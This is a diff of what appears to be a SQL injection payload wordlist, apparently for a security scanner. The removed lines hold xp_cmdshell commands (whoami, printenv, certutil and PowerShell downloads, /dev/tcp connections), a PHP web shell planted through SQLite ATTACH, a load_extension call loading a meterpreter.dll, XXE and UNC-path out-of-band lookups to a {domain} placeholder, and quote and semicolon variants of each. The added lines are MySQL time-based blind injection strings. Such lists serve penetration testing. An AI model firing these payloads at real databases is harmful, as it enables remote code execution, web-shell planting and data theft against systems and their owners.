@@ -1,296 +1,242 @@
-EXEC sp_configure 'xp_cmdshell',1
-RECONFIGURE
-GO
-EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-enable_xp_cmdshell
-AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
-AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000\/2))))
-ATTACH DATABASE '$PWD\/lol.php' AS lol;
-BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-CREATE TABLE lol.pwn (dataz text);
-EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-EXEC sp_configure 'xp_cmdshell',1
-EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-EXEC xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-EXEC xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-EXEC xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-EXEC xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-EXEC xp_cmdshell 'id'
-EXEC xp_cmdshell 'ping {domain} -c 2'
-EXEC xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-EXEC xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-EXEC xp_cmdshell 'printenv'
-EXEC xp_cmdshell 'whoami'
-EXEC xp_cmdshell 'whoami.exe'
-IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"']); ?>\");--
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['exec 6< \/dev\/tcp\/{domain}\/80']); ?>\");--
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['ping {domain}']); ?>\");--
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']); ?>\");--
-INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']); ?>\");--
-LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-SELECT @@version--
-SELECT @@version-- -
-SELECT banner FROM v$version--
-SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-SELECT sql FROM sqlite_schema
-SELECT version FROM v$instance--
-SELECT version()--
-SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-SLEEP(1) \/*' or SLEEP(1) or '\" or SLEEP(1) or \"*\/
-SLEEP(1) \/*\u2018 or SLEEP(1) or \u2018\u201C or SLEEP(1) or \u201C*\/
-UNION SELECT 1,load_extension('\\\\{domain}\\meterpreter.dll','DllMain');--
-copy (select '') to program 'nslookup {domain}}'
-select sqlite_version();
-xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-xp_cmdshell 'id'
-xp_cmdshell 'ping {domain} -c 2'
-xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-xp_cmdshell 'printenv'
-xp_cmdshell 'whoami'
-xp_cmdshell 'whoami.exe'
-'EXEC sp_configure 'xp_cmdshell',1
-'RECONFIGURE
-'GO
-'EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-'enable_xp_cmdshell
-'AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
-'AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000\/2))))
-'ATTACH DATABASE '$PWD\/lol.php' AS lol;
-'BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-'CREATE TABLE lol.pwn (dataz text);
-'EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-'EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-'EXEC sp_configure 'xp_cmdshell',1
-'EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-'EXEC xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-'EXEC xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-'EXEC xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-'EXEC xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-'EXEC xp_cmdshell 'id'
-'EXEC xp_cmdshell 'ping {domain} -c 2'
-'EXEC xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-'EXEC xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-'EXEC xp_cmdshell 'printenv'
-'EXEC xp_cmdshell 'whoami'
-'EXEC xp_cmdshell 'whoami.exe'
-'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"']); ?>\");--
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['exec 6< \/dev\/tcp\/{domain}\/80']); ?>\");--
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['ping {domain}']); ?>\");--
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']); ?>\");--
-'INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']); ?>\");--
-'LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-'SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-'SELECT @@version--
-'SELECT @@version-- -
-'SELECT banner FROM v$version--
-'SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-'SELECT sql FROM sqlite_schema
-'SELECT version FROM v$instance--
-'SELECT version()--
-'SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-'SLEEP(1) \/*' or SLEEP(1) or '\" or SLEEP(1) or \"*\/
-'SLEEP(1) \/*\u2018 or SLEEP(1) or \u2018\u201C or SLEEP(1) or \u201C*\/
-'UNION SELECT 1,load_extension('\\\\{domain}\\meterpreter.dll','DllMain');--
-'copy (select '') to program 'nslookup {domain}}'
-'select sqlite_version();
-'xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-'xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-'xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-'xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-'xp_cmdshell 'id'
-'xp_cmdshell 'ping {domain} -c 2'
-'xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-'xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-'xp_cmdshell 'printenv'
-'xp_cmdshell 'whoami'
-'xp_cmdshell 'whoami.exe'
-\"EXEC sp_configure 'xp_cmdshell',1
-\"RECONFIGURE
-\"GO
-\"EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-\"enable_xp_cmdshell
-\"AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
-\"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000\/2))))
-\"ATTACH DATABASE '$PWD\/lol.php' AS lol;
-\"BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-\"CREATE TABLE lol.pwn (dataz text);
-\"EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-\"EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-\"EXEC sp_configure 'xp_cmdshell',1
-\"EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-\"EXEC xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-\"EXEC xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-\"EXEC xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-\"EXEC xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-\"EXEC xp_cmdshell 'id'
-\"EXEC xp_cmdshell 'ping {domain} -c 2'
-\"EXEC xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-\"EXEC xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-\"EXEC xp_cmdshell 'printenv'
-\"EXEC xp_cmdshell 'whoami'
-\"EXEC xp_cmdshell 'whoami.exe'
-\"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-\"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"']); ?>\");--
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['exec 6< \/dev\/tcp\/{domain}\/80']); ?>\");--
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['ping {domain}']); ?>\");--
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']); ?>\");--
-\"INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']); ?>\");--
-\"LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-\"SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-\"SELECT @@version--
-\"SELECT @@version-- -
-\"SELECT banner FROM v$version--
-\"SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-\"SELECT sql FROM sqlite_schema
-\"SELECT version FROM v$instance--
-\"SELECT version()--
-\"SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-\"SLEEP(1) \/*' or SLEEP(1) or '\" or SLEEP(1) or \"*\/
-\"SLEEP(1) \/*\u2018 or SLEEP(1) or \u2018\u201C or SLEEP(1) or \u201C*\/
-\"UNION SELECT 1,load_extension('\\\\{domain}\\meterpreter.dll','DllMain');--
-\"copy (select '') to program 'nslookup {domain}}'
-\"select sqlite_version();
-\"xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-\"xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-\"xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-\"xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-\"xp_cmdshell 'id'
-\"xp_cmdshell 'ping {domain} -c 2'
-\"xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-\"xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-\"xp_cmdshell 'printenv'
-\"xp_cmdshell 'whoami'
-\"xp_cmdshell 'whoami.exe'
-;EXEC sp_configure 'xp_cmdshell',1
-;RECONFIGURE
-;GO
-;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-;enable_xp_cmdshell
-;AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
-;AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000\/2))))
-;ATTACH DATABASE '$PWD\/lol.php' AS lol;
-;BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-;CREATE TABLE lol.pwn (dataz text);
-;EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-;EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-;EXEC sp_configure 'xp_cmdshell',1
-;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;GO
-;EXEC xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-;EXEC xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-;EXEC xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-;EXEC xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-;EXEC xp_cmdshell 'id'
-;EXEC xp_cmdshell 'ping {domain} -c 2'
-;EXEC xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-;EXEC xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-;EXEC xp_cmdshell 'printenv'
-;EXEC xp_cmdshell 'whoami'
-;EXEC xp_cmdshell 'whoami.exe'
-;IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-;IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))\/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*\/
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']); ?>\");--
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"']); ?>\");--
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['exec 6< \/dev\/tcp\/{domain}\/80']); ?>\");--
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['ping {domain}']); ?>\");--
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']); ?>\");--
-;INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']); ?>\");--
-;LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-;SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-;SELECT @@version--
-;SELECT @@version-- -
-;SELECT banner FROM v$version--
-;SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-;SELECT sql FROM sqlite_schema
-;SELECT version FROM v$instance--
-;SELECT version()--
-;SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-;SLEEP(1) \/*' or SLEEP(1) or '\" or SLEEP(1) or \"*\/
-;SLEEP(1) \/*\u2018 or SLEEP(1) or \u2018\u201C or SLEEP(1) or \u201C*\/
-;UNION SELECT 1,load_extension('\\\\{domain}\\meterpreter.dll','DllMain');--
-;copy (select '') to program 'nslookup {domain}}'
-;select sqlite_version();
-;xp_cmdshell '\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'
-;xp_cmdshell '\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'
-;xp_cmdshell 'certutil -urlcache -f \"http:\/\/{domain}\"'
-;xp_cmdshell 'exec 6< \/dev\/tcp\/{domain}\/80'
-;xp_cmdshell 'id'
-;xp_cmdshell 'ping {domain} -c 2'
-;xp_cmdshell 'powershell -c (New-Object Net.WebClient).DownloadString(\"http:\/\/{domain}\")'
-;xp_cmdshell 'powershell -c Invoke-WebRequest \"http:\/\/{domain}\"'
-;xp_cmdshell 'printenv'
-;xp_cmdshell 'whoami'
-;xp_cmdshell 'whoami.exe'
-copy (select '') to program 'nslookup {domain}}'
-;attach database '\/\/{domain}\/z' as 'z'-- -
-(SELECT load_extension('\/\/{domain}'))
-SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-'copy (select '') to program 'nslookup {domain}}'
-';attach database '\/\/{domain}\/z' as 'z'-- -
-'(SELECT load_extension('\/\/{domain}'))
-'SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-'SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-'EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-'BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-'EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-'LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-'SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-\"copy (select '') to program 'nslookup {domain}}'
-\";attach database '\/\/{domain}\/z' as 'z'-- -
-\"(SELECT load_extension('\/\/{domain}'))
-\"SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-\"SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-\"EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-\"BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-\"EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-\"LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-\"SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-;copy (select '') to program 'nslookup {domain}}'
-;;attach database '\/\/{domain}\/z' as 'z'-- -
-;(SELECT load_extension('\/\/{domain}'))
-;SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http:\/\/{domain}}\/\"> %remote;]>'),'\/l')
-;SELECT * FROM openrowset('SQLNCLI', '{domain}';'a','select 1 from dual');
-;EXEC master.dbo.xp_fileexist '\\\\\\\\{domain}\\\\foo'
-;BULK INSERT mytable FROM '\\\\\\\\{domain}$file';
-;EXEC master.dbo.xp_dirtree '\\\\\\\\{domain}}\\\\foo'
-;LOAD_FILE('\\\\\\\\{domain}\\\\foo')
-;SELECT \u2026 INTO OUTFILE '\\\\\\\\{domain}}\\foo'
-sleep(5)#
-1 or sleep(5)#
-\" or sleep(5)#
-' or sleep(5)#
-\" or sleep(5)=\"
-' or sleep(5)='
-1) or sleep(5)#
-\") or sleep(5)=\"
-') or sleep(5)='
-1)) or sleep(5)#
-\")) or sleep(5)=\"
-')) or sleep(5)='
+##MYSQL##
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+0'or(now()=sysdate()&&SLEEP(1))or'Z
+if(now()=sysdate(),sleep(5),0)\/\"XOR(if(now()=sysdate(),sleep(5),0))OR\"\/
+if(now()=sysdate(),sleep(5),0)\/*'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0))OR\"*\/
+if(now()=sysdate(),sleep(5),0)\/'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)\"\/
+if(1=1,sleep(5),0)\/*'XOR(if(1=1,sleep(5),0))OR'\"XOR(if(1=1,sleep(5),0))OR\"*\/
+if(1337=1337,exp(~(1)),0)\/*'XOR(if(1337=1337,exp(~(1)),0))OR'\"XOR(if(1337=1337,sleep(5),0))OR\"*\/
+SLEEP(5)\/*' or SLEEP(5) or '\" or SLEEP(5) or \"*\/
+%2c(select%5*%5from%5(select(sleep(5)))a)
+(select(0)from(select(sleep(5)))v)
+(SELECT SLEEP(5))
+'%2b(select*from(select(sleep(5)))a)%2b'
+(select*from(select(sleep(5)))a)
+1'%2b(select*from(select(sleep(5)))a)%2b'
+,(select * from (select(sleep(5)))a)
+desc%2c(select*from(select(sleep(5)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--
+'+(select*from(select(sleep(5)))a)+'
+(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'\"
+(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*%2f
+(select(0)from(select(sleep(5)))v)\/*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*\/
+',''),\/*test*\/%26%26%09sLeEp(5)%09--+
+1 and sleep 5--
+1 and sleep 5
+1 and sleep(5)--
+1 and sleep(5)
+' and sleep 5--
+' and sleep 5
+' and sleep 5 and '1'='1
+' and sleep(5) and '1'='1
+' and sleep(5)--
+' and sleep(5)
+' AnD SLEEP(5) ANd '1
+and sleep 5--
+and sleep 5
+and sleep(5)--
+and sleep(5)
+and SELECT SLEEP(5); #
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+ and sleep 5--
+ and sleep 5
+ and sleep(5)--
+ and sleep(5)
+ and SELECT SLEEP(5); #
+ ' AND SLEEP(5)#
+\" AND SLEEP(5)#
+') AND SLEEP(5)#
+OR BLIND:
+or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT SLEEP(5); #
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)=\"
+or SLEEP(5)='
+ or sleep 5--
+ or sleep 5
+ or sleep(5)--
+ or sleep(5)
+ or SELECT SLEEP(5); #
+ ' OR SLEEP(5)#
+\" OR SLEEP(5)#
+') OR SLEEP(5)#
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((1337=1337
+))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1337
+) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
++(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))+
+)) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))|[1
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+\" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
